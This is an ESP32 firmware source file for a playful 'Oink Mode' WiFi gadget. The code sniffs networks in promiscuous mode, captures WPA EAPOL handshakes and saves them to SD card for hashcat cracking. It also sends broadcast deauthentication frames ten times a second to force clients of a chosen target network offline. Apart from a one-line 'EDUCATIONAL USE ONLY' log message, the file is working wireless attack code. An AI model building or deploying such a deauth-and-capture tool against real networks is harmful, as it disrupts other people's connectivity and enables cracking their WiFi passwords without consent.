// Oink Mode implementation

#include "oink.h"
#include "../core/config.h"
#include "../ui/display.h"
#include "../piglet/mood.h"
#include "../ml/inference.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <SPI.h>
#include <SD.h>

// Static members
bool OinkMode::running = false;
bool OinkMode::scanning = false;
bool OinkMode::deauthing = false;
bool OinkMode::channelHopping = true;
uint8_t OinkMode::currentChannel = 1;
uint32_t OinkMode::lastHopTime = 0;
uint32_t OinkMode::lastScanTime = 0;
std::vector<DetectedNetwork> OinkMode::networks;
std::vector<CapturedHandshake> OinkMode::handshakes;
int OinkMode::targetIndex = -1;
uint32_t OinkMode::packetCount = 0;
uint32_t OinkMode::deauthCount = 0;

// Channel hop order (most common channels first)
const uint8_t CHANNEL_HOP_ORDER[] = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
const uint8_t CHANNEL_COUNT = sizeof(CHANNEL_HOP_ORDER);
uint8_t currentHopIndex = 0;

void OinkMode::init() {
    networks.clear();
    handshakes.clear();
    targetIndex = -1;
    packetCount = 0;
    deauthCount = 0;
    
    Serial.println("[OINK] Initialized");
}

void OinkMode::start() {
    if (running) return;
    
    Serial.println("[OINK] Starting...");
    
    // Initialize WiFi in promiscuous mode
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
    
    // Set channel
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    
    running = true;
    scanning = true;
    lastHopTime = millis();
    lastScanTime = millis();
    
    Display::setWiFiStatus(true);
    Serial.println("[OINK] Running");
}

void OinkMode::stop() {
    if (!running) return;
    
    Serial.println("[OINK] Stopping...");
    
    deauthing = false;
    scanning = false;
    
    esp_wifi_set_promiscuous(false);
    
    running = false;
    Display::setWiFiStatus(false);
    
    Serial.println("[OINK] Stopped");
}

void OinkMode::update() {
    if (!running) return;
    
    uint32_t now = millis();
    
    // Channel hopping
    if (channelHopping && !deauthing) {
        if (now - lastHopTime > Config::wifi().channelHopInterval) {
            hopChannel();
            lastHopTime = now;
        }
    }
    
    // Periodic network cleanup - remove stale entries
    if (now - lastScanTime > 30000) {
        for (auto it = networks.begin(); it != networks.end();) {
            if (now - it->lastSeen > 60000) {
                it = networks.erase(it);
            } else {
                ++it;
            }
        }
        lastScanTime = now;
    }
}

void OinkMode::startScan() {
    scanning = true;
    channelHopping = true;
    currentHopIndex = 0;
    Serial.println("[OINK] Scan started");
}

void OinkMode::stopScan() {
    scanning = false;
    Serial.println("[OINK] Scan stopped");
}

void OinkMode::selectTarget(int index) {
    if (index >= 0 && index < (int)networks.size()) {
        targetIndex = index;
        networks[index].isTarget = true;
        
        // Lock to target's channel
        channelHopping = false;
        setChannel(networks[index].channel);
        
        Serial.printf("[OINK] Target selected: %s\n", networks[index].ssid);
    }
}

void OinkMode::clearTarget() {
    if (targetIndex >= 0 && targetIndex < (int)networks.size()) {
        networks[targetIndex].isTarget = false;
    }
    targetIndex = -1;
    channelHopping = true;
    Serial.println("[OINK] Target cleared");
}

DetectedNetwork* OinkMode::getTarget() {
    if (targetIndex >= 0 && targetIndex < (int)networks.size()) {
        return &networks[targetIndex];
    }
    return nullptr;
}

void OinkMode::startDeauth() {
    if (!running || targetIndex < 0) return;
    
    deauthing = true;
    channelHopping = false;
    Serial.println("[OINK] Deauth started (EDUCATIONAL USE ONLY)");
}

void OinkMode::stopDeauth() {
    deauthing = false;
    Serial.println("[OINK] Deauth stopped");
}

void OinkMode::setChannel(uint8_t ch) {
    if (ch < 1 || ch > 14) return;
    currentChannel = ch;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

void OinkMode::enableChannelHop(bool enable) {
    channelHopping = enable;
}

void OinkMode::hopChannel() {
    currentHopIndex = (currentHopIndex + 1) % CHANNEL_COUNT;
    currentChannel = CHANNEL_HOP_ORDER[currentHopIndex];
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
}

void OinkMode::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!running) return;
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint16_t len = pkt->rx_ctrl.sig_len;
    int8_t rssi = pkt->rx_ctrl.rssi;
    
    if (len < 24) return;  // Minimum 802.11 header
    
    packetCount++;
    
    const uint8_t* payload = pkt->payload;
    uint8_t frameType = (payload[0] >> 2) & 0x03;
    uint8_t frameSubtype = (payload[0] >> 4) & 0x0F;
    
    switch (type) {
        case WIFI_PKT_MGMT:
            if (frameSubtype == 0x08) {  // Beacon
                processBeacon(payload, len, rssi);
            }
            break;
            
        case WIFI_PKT_DATA:
            processDataFrame(payload, len, rssi);
            break;
            
        default:
            break;
    }
    
    // If deauthing, periodically send deauth frames
    if (deauthing && targetIndex >= 0) {
        static uint32_t lastDeauth = 0;
        uint32_t now = millis();
        
        if (now - lastDeauth > 100) {  // 10 deauths per second
            DetectedNetwork* target = &networks[targetIndex];
            // Broadcast deauth
            uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
            sendDeauthFrame(target->bssid, broadcast, 7);  // Reason: Class 3 frame
            deauthCount++;
            lastDeauth = now;
        }
    }
}

void OinkMode::processBeacon(const uint8_t* payload, uint16_t len, int8_t rssi) {
    if (len < 36) return;
    
    // BSSID is at offset 16
    const uint8_t* bssid = payload + 16;
    
    int idx = findNetwork(bssid);
    
    if (idx < 0) {
        // New network
        DetectedNetwork net = {0};
        memcpy(net.bssid, bssid, 6);
        net.rssi = rssi;
        net.lastSeen = millis();
        net.beaconCount = 1;
        net.isTarget = false;
        
        // Parse SSID from IE
        uint16_t offset = 36;
        while (offset + 2 < len) {
            uint8_t id = payload[offset];
            uint8_t ieLen = payload[offset + 1];
            
            if (offset + 2 + ieLen > len) break;
            
            if (id == 0 && ieLen > 0 && ieLen < 33) {
                memcpy(net.ssid, payload + offset + 2, ieLen);
                net.ssid[ieLen] = 0;
                break;
            }
            
            offset += 2 + ieLen;
        }
        
        // Extract features for ML
        net.features = FeatureExtractor::extractFromBeacon(payload, len, rssi);
        
        // Get channel from DS Parameter Set IE
        offset = 36;
        while (offset + 2 < len) {
            uint8_t id = payload[offset];
            uint8_t ieLen = payload[offset + 1];
            
            if (id == 3 && ieLen == 1) {  // DS Parameter Set
                net.channel = payload[offset + 2];
                break;
            }
            
            offset += 2 + ieLen;
        }
        
        if (net.channel == 0) {
            net.channel = currentChannel;
        }
        
        networks.push_back(net);
        Mood::onNewNetwork();
        
        Serial.printf("[OINK] New network: %s (ch%d, %ddBm)\n", 
                     net.ssid[0] ? net.ssid : "<hidden>", net.channel, net.rssi);
    } else {
        // Update existing
        networks[idx].rssi = rssi;
        networks[idx].lastSeen = millis();
        networks[idx].beaconCount++;
    }
}

void OinkMode::processDataFrame(const uint8_t* payload, uint16_t len, int8_t rssi) {
    if (len < 28) return;
    
    // Check for EAPOL (LLC/SNAP header: AA AA 03 00 00 00 88 8E)
    // Data starts after 802.11 header (24 bytes for data frames)
    // May have QoS (2 bytes) and/or HTC (4 bytes)
    
    uint16_t offset = 24;
    
    // Check ToDS/FromDS flags
    uint8_t toDs = (payload[1] & 0x01);
    uint8_t fromDs = (payload[1] & 0x02) >> 1;
    
    // Adjust offset for address 4 if needed
    if (toDs && fromDs) offset += 6;
    
    // Check for QoS Data
    if ((payload[0] & 0x80) && (payload[0] & 0x08)) {
        offset += 2;
    }
    
    if (offset + 8 > len) return;
    
    // Check LLC/SNAP header for EAPOL
    if (payload[offset] == 0xAA && payload[offset+1] == 0xAA &&
        payload[offset+2] == 0x03 && payload[offset+3] == 0x00 &&
        payload[offset+4] == 0x00 && payload[offset+5] == 0x00 &&
        payload[offset+6] == 0x88 && payload[offset+7] == 0x8E) {
        
        // This is EAPOL!
        const uint8_t* srcMac = payload + 10;  // TA
        const uint8_t* dstMac = payload + 4;   // RA
        
        processEAPOL(payload + offset + 8, len - offset - 8, srcMac, dstMac);
    }
}

void OinkMode::processEAPOL(const uint8_t* payload, uint16_t len, 
                             const uint8_t* srcMac, const uint8_t* dstMac) {
    if (len < 4) return;
    
    // EAPOL: version(1) + type(1) + length(2) + descriptor(...)
    uint8_t type = payload[1];
    
    if (type != 3) return;  // Only interested in EAPOL-Key
    
    if (len < 99) return;  // Minimum EAPOL-Key frame
    
    // Key info at offset 5-6
    uint16_t keyInfo = (payload[5] << 8) | payload[6];
    uint8_t keyType = (keyInfo >> 3) & 0x01;  // 0=Group, 1=Pairwise
    uint8_t install = (keyInfo >> 6) & 0x01;
    uint8_t keyAck = (keyInfo >> 7) & 0x01;
    uint8_t keyMic = (keyInfo >> 8) & 0x01;
    uint8_t secure = (keyInfo >> 9) & 0x01;
    
    uint8_t messageNum = 0;
    if (keyAck && !keyMic) messageNum = 1;
    else if (!keyAck && keyMic && !install) messageNum = 2;
    else if (keyAck && keyMic && install) messageNum = 3;
    else if (!keyAck && keyMic && secure) messageNum = 4;
    
    if (messageNum == 0) return;
    
    // Capture handshake
    CapturedHandshake hs = {0};
    
    // Determine which is AP (sender of M1/M3)
    if (messageNum == 1 || messageNum == 3) {
        memcpy(hs.bssid, srcMac, 6);
        memcpy(hs.station, dstMac, 6);
    } else {
        memcpy(hs.bssid, dstMac, 6);
        memcpy(hs.station, srcMac, 6);
    }
    
    hs.messageNum = messageNum;
    hs.timestamp = millis();
    uint16_t copyLen = min((uint16_t)512, len);
    memcpy(hs.eapolData, payload, copyLen);
    hs.eapolLen = copyLen;
    
    // Look up SSID from networks
    int netIdx = findNetwork(hs.bssid);
    if (netIdx >= 0) {
        strncpy(hs.ssid, networks[netIdx].ssid, 32);
    }
    
    handshakes.push_back(hs);
    
    Serial.printf("[OINK] EAPOL M%d captured! BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
                 messageNum, hs.bssid[0], hs.bssid[1], hs.bssid[2],
                 hs.bssid[3], hs.bssid[4], hs.bssid[5]);
    
    // Check if we have complete handshake (M1+M2 or M2+M3)
    // For simplicity, trigger mood on any capture
    Mood::onHandshakeCaptured();
}

void OinkMode::sendDeauthFrame(const uint8_t* bssid, const uint8_t* station, uint8_t reason) {
    // Deauth frame structure
    uint8_t deauthPacket[26] = {
        0xC0, 0x00,  // Frame Control: Deauth
        0x00, 0x00,  // Duration
        // Address 1 (Destination)
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        // Address 2 (Source/BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        // Address 3 (BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,  // Sequence
        0x07, 0x00   // Reason code
    };
    
    memcpy(deauthPacket + 4, station, 6);
    memcpy(deauthPacket + 10, bssid, 6);
    memcpy(deauthPacket + 16, bssid, 6);
    deauthPacket[24] = reason;
    
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
}

int OinkMode::findNetwork(const uint8_t* bssid) {
    for (int i = 0; i < (int)networks.size(); i++) {
        if (memcmp(networks[i].bssid, bssid, 6) == 0) {
            return i;
        }
    }
    return -1;
}

bool OinkMode::saveHandshakes(const char* path) {
    // Save in hashcat format (PCAP or hccapx)
    // This is a placeholder - full implementation would use proper format
    
    File f = SD.open(path, FILE_WRITE);
    if (!f) {
        Serial.printf("[OINK] Failed to save handshakes to %s\n", path);
        return false;
    }
    
    // Write simple dump for now
    for (const auto& hs : handshakes) {
        f.printf("SSID:%s BSSID:%02X%02X%02X%02X%02X%02X M%d\n",
                hs.ssid,
                hs.bssid[0], hs.bssid[1], hs.bssid[2],
                hs.bssid[3], hs.bssid[4], hs.bssid[5],
                hs.messageNum);
        // Write raw EAPOL data
        f.write(hs.eapolData, hs.eapolLen);
        f.println();
    }
    
    f.close();
    Serial.printf("[OINK] Saved %d handshakes to %s\n", handshakes.size(), path);
    return true;
}
